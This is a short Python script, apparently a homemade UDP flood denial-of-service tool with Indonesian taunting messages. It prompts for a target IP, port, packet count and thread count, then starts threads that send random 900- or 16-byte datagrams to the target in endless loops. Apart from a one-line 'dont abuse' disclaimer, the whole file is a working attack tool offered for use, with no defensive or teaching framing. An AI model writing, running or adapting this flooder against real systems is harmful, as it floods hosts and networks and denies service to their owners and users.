import random
import socket
import threading
import os,sys

os.system("clear")
print('''
    

''')
print("dont abuse")
print("Tools Lamm")
ip = str(input(" Target IP:"))
port = int(input(" Target Port:"))
choice = str(input("Serang gak (y/n):"))
times = int(input(" Packets :"))
threads = int(input(" Threads:"))

os.system("clear")
def run():
	data = random._urandom(900)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Rex Riot Ni Dek !!!")
		except:
			print("[X] AMPUN BANG Tar Jebol!!!")

def run2():
	data = random._urandom(900)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Rex Riot Ni Dek!!!")
		except:
			s.close()
			print("[X] AMPUN BANG Tar Jebol!!!")

def run3():
	data = random._urandom(16)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Rex Riot Ni Dek !!!")
		except:
			s.close()
			print("[X] AMPUN BANG Tar Jebol!!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
	else:
		th = threading.Thread(target = run3)
		th.start()
